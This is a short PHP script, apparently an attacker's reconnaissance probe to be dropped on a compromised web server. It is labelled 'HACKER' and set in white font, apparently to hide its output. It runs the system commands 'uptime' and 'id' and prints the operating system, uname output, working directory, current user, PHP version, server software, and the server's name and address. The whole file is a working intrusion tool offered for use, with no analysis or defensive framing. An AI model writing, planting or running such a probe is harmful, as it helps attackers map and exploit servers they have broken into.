<font color="white">
<?
echo "HACKER";
echo"<br>";
$hack1 = @php_uname();
$hack2 = system(uptime);
$hack3 = system(id);
$hack4 = @getcwd();
$hack5 = getenv("SERVER_SOFTWARE");
$hack6 = phpversion();
$hack7 = $_SERVER['SERVER_NAME'];
$hack8 = gethostbyname($SERVER_ADDR);
$hack9 = get_current_user();
$os = @PHP_OS;
echo "operation system: $os";
echo"<br>";
echo "uname -a: $hack1";
echo"<br>";
echo "uptime: $hack2";
echo"<br>";
echo "id: $hack3";
echo"<br>";
echo "pwd: $hack4";
echo"<br>";
echo "user: $hack9";
echo"<br>";
echo "phpv: $hack6";
echo"<br>";
echo "SoftWare: $hack5";
echo"<br>";
echo "Server Name: $hack7";
echo"<br>";
echo "Server Address: $hack8";
echo"<br>";
echo "HACKER technical information retrieval";
exit;
?>
</font>